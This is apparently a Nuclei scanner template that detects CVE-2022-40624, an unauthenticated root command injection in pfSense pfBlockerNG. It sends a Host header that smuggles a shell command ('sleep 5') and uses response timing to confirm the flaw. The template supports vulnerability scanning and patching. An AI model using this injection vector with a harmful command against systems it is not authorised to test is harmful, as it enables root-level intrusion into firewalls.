id: CVE-2022-40624

info:
  name: pfSense pfBlockerNG RCE via Host Header Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: pfSense pfBlockerNG through 2.1.4_27 allows remote attackers to execute arbitrary OS commands as root via the HTTP Host header.
  impact: |
    Allows remote attackers to execute arbitrary code on the affected system
  remediation: |
    Update to the latest version of pfSense pfBlockerNG to mitigate the vulnerability
  reference:
    - https://github.com/dhammon/pfBlockerNg-CVE-2022-40624
    - https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/
    - https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html
    - https://github.com/dhammon/pfBlockerNg-RCE
    - https://github.com/k0mi-tg/CVE-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-40624
    cwe-id: CWE-78
    epss-score: 0.0143
    epss-percentile: 0.87092
    cpe: cpe:2.3:a:pfsense:pfblockerng:*:*:*:*:*:*:*:*
  metadata:
    vendor: pfsense
    product: pfblockerng

http:
  - method: GET
    path:
      - "/pfblockerng/www/index.php"

    headers:
      Host: "test.test2' *; sleep 5; '"
      Content-Length: "2"
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
